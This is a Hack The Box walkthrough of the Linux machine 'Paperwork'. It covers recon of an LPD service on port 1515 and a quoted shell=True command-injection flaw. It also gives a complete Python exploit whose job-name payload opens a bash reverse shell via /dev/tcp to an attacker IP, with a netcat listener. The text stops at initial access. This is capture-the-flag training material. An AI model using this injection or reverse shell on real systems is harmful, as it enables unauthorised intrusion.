# Hack The Box - Paperwork Walkthrough

## Machine Information
| Field | Value |
|------|------|
| Name | Paperwork |
| Platform | Hack The Box |
| OS | Linux |
| Difficulty | Easy |
| Release Date | 11th July, 2026 |

## Overview
Paperwork is a Linux machine that exploits vulnerabilities in an LPD (Line Printer Daemon) service running on port 1515. The service implements the RFC 1179 protocol but fails to sanitize user input, leading to shell injection via a command construction vulnerability. 
After gaining initial access as the lp user through LPD exploitation, privilege escalation is achieved by abusing file permissions on critical binaries that are executed by root processes.  

## Attack Chain    
Reconnaissance: Discover LPD service on port 1515 with a custom "Archive_Printer" processor  
Exploitation: Forge LPD protocol messages with shell metacharacters to inject arbitrary bash commands  
Initial Access: Achieve RCE as lp user via shell injection in job name processing  
Privilege Escalation: Exploit insecure file permissions to escalate to root  
Post-Exploitation: Flag capture and system compromise  

## Skills / Techniques  
Network Service Enumeration (LPD/RFC 1179)  
Protocol Analysis & Packet Crafting  
Shell Injection & Command Injection  
Python Socket Programming  
Reverse Shell Payload Construction  
Privilege Escalation via File Permissions  
Bash/Shell Exploitation  

## RECON 
```
sudo nmap -sV -p- <IPAddress>                       
Nmap scan report for paperwork.htb (<IPAddress>)
Host is up (0.098s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.99%I=7%D=7/12%Time=6A53C480%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printin
SF:g\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### HTTP Service Enumeration (Port 80)  
Initial port scanning revealed an Nginx web server running on port 80. Accessing the service displays an "Intake Portal" for the "Paperwork" archive system.  
The page contains a System Configuration section that provides critical information about the LPD backend:  
- Protocol: Compliance Level: RFC 1179
- Target Queue: archive_intake
- Internal Processor: paperwork-archive-v1.02

More importantly, the portal offers a downloadable archive containing backend source code. By downloading this ZIP file, we obtain:  
- server.py — The vulnerable LPD server implementation

The service on port 1515 was initially unrecognized by Nmap. However, the service responded with a distinctive banner:  
Archive_Printer is ready and printing.  

### Initial Service Testing - Telnet Connection Attempts  
To interact with the LPD service on port 1515, telnet was used for initial reconnaissance:  
```
telnet 10.129.29.179 1515
Connected to 10.129.29.179.
Escape character is '^]'.
```
Attempting basic shell commands such as ls resulted in immediate connection closure, indicating the service expects a specific protocol rather than accepting arbitrary text input.  

### Source Code Analysis & Control Bypass  
Examining the downloaded server.py revealed critical validation checks:  
#### Queue Name Validation:
```
def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    
    if queue not in VALID_QUEUE:
        print(f"{self.id} Rejected: Invalid queue '{queue}'")
        self.sock.send(b'\x01') 
        return
```
The server extracts the queue name from the received data (skipping the first byte which contains the command \x02) and validates it against the LPD_QUEUE environment variable.  
Invalid queues result in a \x01 (error) response and connection termination.  
Once a valid queue is accepted, the server enters a loop to receive file data:    
The server expects a size value which dictates how many bytes of content to receive. This size is parsed from the incoming data after the subcommand byte.  
#### Job Name Extraction & Injection Point
Once a valid queue is accepted, the server processes incoming data and searches for a line starting with J:
```
job_name = "Unknown"
for line in decoded_content.split('\n'):
    line = line.strip()
    if line.startswith('J'):
        job_name = line[1:]
        break
```
The J marker is part of the LPD protocol specification for designating the job name. Everything after the J character becomes the job_name variable. This is the critical injection point.  

#### Command Injection Vulnerability  
The vulnerability lies in how job_name is processed:
```
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
The job_name variable is inserted directly into a shell command with shell=True enabled and no sanitization. This enables arbitrary command injection through shell metacharacters.
A payload like:  
```
J'; bash -c "reverse_shell_command" # extracts as:  
```
Which constructs the final command:
```
echo 'Archive: '; bash -c "reverse_shell_command" #' >> /tmp/archive.log
```
The closing quote terminates the echo string, the semicolon separates commands, and the # comments out the remaining log redirection—achieving arbitrary code execution.
Valid Queue: archive_intake  
The HTTP portal revealed:  
- Target Queue: archive_intake
With the valid queue name and injection point identified, exploitation became straightforward.

### Exploit Execution
The following Python script automates the exploitation chain against the vulnerable LPD service:  
```
import socket, time
MACHINE_IP = '<target_ip>'
YOUR_IP = '<attacker_ip>'
YOUR_PORT = 4443

sock = socket.socket()
sock.connect((MACHINE_IP, 1515))

# Step 1: Queue Initialization
sock.send(b'\x02archive_intake\n')
time.sleep(0.3)
sock.recv(1024)

# Step 2: Payload Header Construction
job = f"J'; bash -c \"bash -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1\" #\n"
header = b'\x02' + str(len(job)).encode() + b'\n'
sock.send(header)
time.sleep(0.3)
sock.recv(1024)

# Step 3: Send Payload
sock.send(job.encode())
time.sleep(0.3)
sock.recv(1024)

# Step 4: Finalize
sock.send(b'\x03\x00\n')
time.sleep(1)
sock.close()

print('[+] Exploit sent!')
```

### Exploitation Sequence
Step 1 - Queue Initialization: Sends the print job submission command (\x02) with the valid queue name archive_intake. The sleep allows server processing, and recv() consumes the server's ACK.
Step 2 - Payload Header: Constructs the job name string beginning with J (LPD marker), followed by a single quote that closes the echo string in the vulnerable subprocess. The bash command creates an interactive reverse shell via /dev/tcp. The header contains the submission command, payload size in ASCII, and newline delimiter.
Step 3 - Send Payload: Transmits the actual payload. The server extracts the job name by searching for the line starting with J.
Step 4 - Finalize: Sends the LPD "end of job" command (\x03), triggering server-side processing of the malicious payload.

The extracted job_name is:  
```
'; bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" #  
```
This transforms the subprocess command into:  
```
echo 'Archive: '; bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" #' >> /tmp/archive.log  
```
### Execution
#### Terminal 1 - Listener:
```
nc -lvnp 4443
```
#### Terminal 2 - Run Exploit:
```
python exploit.py
```
A reverse shell prompt appears connected as the ** user.




















